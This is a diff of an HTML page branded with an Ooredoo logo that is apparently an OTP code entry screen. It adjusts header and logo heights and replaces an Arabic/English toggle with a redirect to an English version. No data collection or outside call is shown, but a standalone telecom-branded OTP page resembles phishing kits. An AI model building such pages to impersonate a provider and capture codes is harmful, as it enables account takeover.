@@ -33,7 +33,7 @@
   }
   .header-inner {
     max-width: 1200px; margin: 0 auto;
-    height: 64px; padding: 0 16px;
+    height: 68px; padding: 0 16px;
     display: flex; align-items: center; justify-content: space-between;
   }
   .logo { font-size: 1.5rem; font-weight: 700; color: var(--red); text-decoration: none; }
@@ -41,12 +41,12 @@
   .logo-placeholder {
     display: flex;
     align-items: center;
-    height: 50px;
+    height: 56px;
     width: auto;
   }
   
   .ooredoo-logo {
-    height: 50px;
+    height: 56px;
     width: auto;
     object-fit: contain;
   }
@@ -264,8 +264,7 @@
     </div>
     <div class="header-actions">
       <button class="lang-toggle" id="langToggle" aria-label="تغيير اللغة">
-        <span class="active" data-lang="ar">ع</span>
-        <span data-lang="en">EN</span>
+        <span class="active" data-lang="en">EN</span>
       </button>
       <button class="menu-btn" id="menuBtn" aria-label="القائمة" aria-expanded="false" aria-controls="navMenu">
         <span></span><span></span><span></span>
@@ -321,10 +320,7 @@
 
   const langToggle = document.getElementById('langToggle');
   langToggle.addEventListener('click', () => {
-    langToggle.querySelectorAll('span').forEach(s => s.classList.toggle('active'));
-    const lang = langToggle.querySelector('.active').dataset.lang;
-    document.documentElement.lang = lang;
-    document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+    window.location.href = 'otp_ooredoo_en.html';
   });
 
   // معالجة حقول OTP
